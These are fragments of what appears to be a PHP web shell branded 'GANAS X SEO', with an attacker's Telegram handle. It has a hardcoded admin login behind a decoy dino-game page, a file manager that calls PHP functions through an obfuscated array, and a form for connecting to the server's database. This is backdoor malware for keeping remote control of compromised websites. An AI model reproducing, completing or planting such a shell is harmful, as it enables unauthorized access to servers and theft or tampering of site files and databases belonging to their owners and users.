...
$username = "admin";
$passwordHash = '$2a$12$vWPLQVi5WG.UT7XTYCczyOtmljNV3RIeRlnzT3vs8LdLmK2KQdP8i'; // Hash bcrypt
...
<body>
    <div class="login-box">
        ...
        <canvas id="dinoGame" width="300" height="150"></canvas>
    </div>
    <script>
        let canvas = document.getElementById("dinoGame");
        let ctx = canvas.getContext("2d");
        let dino = { x: 30, y: 100, width: 20, height: 20, dy: 0, jumping: false };
        let gravity = 0.5;
...
<head>
    ...
    <title>..::GANAS X SEO [ <?= $_SERVER['HTTP_HOST']; ?> ]::..</title>
...
<body>
    <div class="menu-header">
        <ul>
            ...
            <li><i class="fa fa-telegram"></i>&nbsp;@GanaSEO1337</li>
    ...
    $file_manager = $fungsi[1]("{.[!.],}*", GLOB_BRACE);$get_cwd = $fungsi[0]();
    ?>
                    ...
                    <div class="modal-body">
                        <div class="modal-isi">
                            <form action="" method="post">
                                ...
                                <br><br><input type="text" name="db_host" class="modal-create-input" placeholder="DB_HOST" value="127.0.0.1">
                                <br><br>
